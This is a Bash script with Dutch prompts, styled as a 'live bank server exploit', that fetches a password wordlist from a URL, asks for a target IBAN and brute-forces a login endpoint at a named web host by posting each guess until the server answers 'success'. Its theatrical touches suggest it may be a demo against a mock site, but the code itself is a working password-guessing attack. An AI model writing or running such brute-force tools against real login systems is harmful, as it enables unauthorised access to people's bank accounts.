#!/bin/bash

# Kleuren voor het hacker-uiterlijk
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

while true; do
    clear
    echo -e "${GREEN}======================================================"
    echo -e "          LIVE BANK SERVER EXPLOIT v5.0 (LINUX)"
    echo -e "======================================================${NC}"
    echo ""

    # Stap 1: De Wordlist ophalen
    echo -e "${CYAN}[1] VOORBEREIDING${NC}"
    read -p "Plak de URL van de GitHub Wordlist (Raw): " urlList

    echo -e "Bezig met ophalen van wordlist..."
    wordlist=$(curl -s "$urlList")

    if [ -z "$wordlist" ]; then
        echo -e "${RED}[FOUT] Kon GitHub lijst niet ophalen. Controleer de link!${NC}"
        read -p "Druk op Enter om opnieuw te proberen..."
        continue
    fi

    echo -e "SUCCES: Lijst geladen van GitHub."

    # Stap 2: Doelwit instellen
    echo ""
    echo -e "${CYAN}[2] TARGETING${NC}"
    read -p "Voer het doelwit IBAN in: " iban
    echo ""
    echo "Verbinding maken met: https://telefoon.wilste.nl..."
    sleep 1
    echo "------------------------------------------------------"

    # Stap 3: De Aanval
    apiUrl="https://telefoon.wilste.nl/bank/verify-login"
    gevonden=false

    # Loop door elk woord in de lijst
    for gok in $wordlist; do
        # Verwijder onzichtbare tekens (zoals \r van Windows-bestanden)
        gok=$(echo $gok | tr -d '\r')

        echo -n "PROBEREN: $gok ... "

        # Stuur het JSON verzoek naar de server
        response=$(curl -s -X POST "$apiUrl" \
            -H "Content-Type: application/json" \
            -d "{\"iban\":\"$iban\", \"password\":\"$gok\"}")

        # Controleer of de server 'success' teruggeeft
        if [[ "$response" == *"success"* ]]; then
            echo -e "${GREEN}[SUCCESS]${NC}"
            echo ""
            echo "******************************************************"
            echo -e "    ${GREEN}[SUCCESS] MATCH GEVONDEN OP DE SERVER!${NC}"
            echo "    WACHTWOORD: $gok"
            echo "******************************************************"
            gevonden=true
            break
        else
            echo -e "${RED}[GEWEIGERD]${NC}"
        fi

        # Een kleine pauze voor het effect
        sleep 0.1
    done

    if [ "$gevonden" = false ]; then
        echo ""
        echo -e "${RED}[FAIL] Geen match gevonden. Probeer een andere lijst.${NC}"
    fi

    echo ""
    read -p "Scherm resetten voor een nieuw thema? (j/n): " keuze
    if [[ "$keuze" != "j" ]]; then
        break
    fi
done

echo "Systeem afgesloten."